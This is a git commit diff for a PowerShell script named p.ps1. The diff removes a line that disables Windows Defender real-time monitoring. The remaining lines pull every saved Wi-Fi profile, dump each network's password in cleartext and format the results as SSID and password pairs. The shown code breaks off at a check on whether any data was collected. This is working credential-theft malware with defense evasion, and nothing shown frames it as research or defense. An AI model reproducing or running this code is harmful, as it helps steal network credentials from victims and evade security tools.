c434d6a09d032ef21e8828e55b8901fd8ec9fde8
norlinfp30-spec <norlinfp30@gmail.com>
2026-02-28 08:01:44 -0400

    p.ps1

--- p.ps1
+++ p.ps1
@@ -1,4 +1,3 @@
-Set-MpPreference -DisableRealtimeMonitoring $true -EA SilentlyContinue
 $w = netsh wlan show prof | sls ':(.+)$' | %{$_.Matches.Groups[1].Value.Trim()} | %{$n=$_; $k=(netsh wlan show prof name="$n" key=clear | sls 'Key Content\W+:(.+)$' | %{$_.Matches.Groups[1].Value.Trim()}); if($k){"SSID:$n | Pass:$k"}}
 $data = $w | Out-String
 if ($data.Trim()) {
